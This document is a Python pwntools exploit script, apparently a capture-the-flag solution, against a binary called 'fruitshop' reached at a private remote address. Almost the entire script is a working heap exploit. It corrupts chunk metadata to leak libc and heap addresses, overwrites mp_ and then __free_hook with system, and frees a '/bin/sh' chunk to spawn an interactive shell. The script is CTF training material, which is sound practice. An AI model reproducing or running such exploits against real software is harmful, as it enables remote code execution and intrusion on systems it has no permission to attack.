# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './fruitshop'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '192.168.1.107'
    port = '8888'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add( idx, text = 'a\n', type = 'Banana' ):
    cmd(1)
    sla(':\n' , type)
    sla('index:' , idx)
    sa('Content:' , text)

def edit( idx, text = 'a\n', type = 'Banana'):
    cmd(2)
    sla(':\n' , type)
    sla('idx:' , idx)
    sa('Content:' , text)

def edit_a( idx, text = 'a\n', type = 'Banana' ,text1 = 'a',text2 = 'a' , text3 = 'a'):
    cmd(2)
    sla(':\n' , type)
    sla('idx:' , idx)
    sa('Do~\n' , text)
    sa('Re~\n' , text1)
    sa('Mi~\n' , text2)
    sa('Fa~\n' , text3)


def show( idx , type = 'Banana'):
    cmd(3)
    sla(':\n' , type)
    sla('idx:' , idx)

def delete(idx , type = 'Banana'):
    cmd(4)
    sla(':\n' , type)
    sla('idx:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0 , type = 'Apple' , text = flat(0 , 0x21)*0xdd) #0xdd0
    add(0 , type = 'Durian' ,text = flat(0 , 0x21)*3)  #0x120
    add(1 , type = 'Banana')
    add(1 , type = 'Durian')
    add(0 , type = 'Cherry')

    # add(2)
    # add(0 , type = 'Banana') #0xcb0
    # add(0 ,  type = 'Cherry') #0xe50

    delete(0 , type = 'Apple')
    add(1 , type = 'Durian')
    add(0 , type = 'Banana')
    edit_a(0 , type = 'Apple' , text = '\x00'*0x110 + flat(0 , 0xcb1))

    delete(1)
    add(1 , type = 'Apple')
    delete(0)

    show(1 , type = 'Banana')

    leak = l64() 
    libc.address =  leak - 0x1ed1e0
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    mp_ = 0x1ec2d0 + libc.address
    lg('__free_hook',__free_hook)

    leak1 = l64()
    p.recv(2)
    leak2 = uu64(6)
    heap_base = leak - 0x1190
    
    edit(1  , type = 'Banana' ,text = flat(leak1,leak1,leak2,mp_ - 0x20))
    add(2 , type = 'Apple')
    delete(0 ,  type = 'Cherry')

    edit(0 , type = 'Banana' , text = p64(__free_hook - 0x8)*0xcb)
    add(1 , type = 'Cherry' , text = flat('/bin/sh\x00' , system_addr))
    delete(1 , type = 'Cherry')

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   fruitshop.py
@Time    :   2022/07/02 11:27:43
@Author  :   Niyah 
'''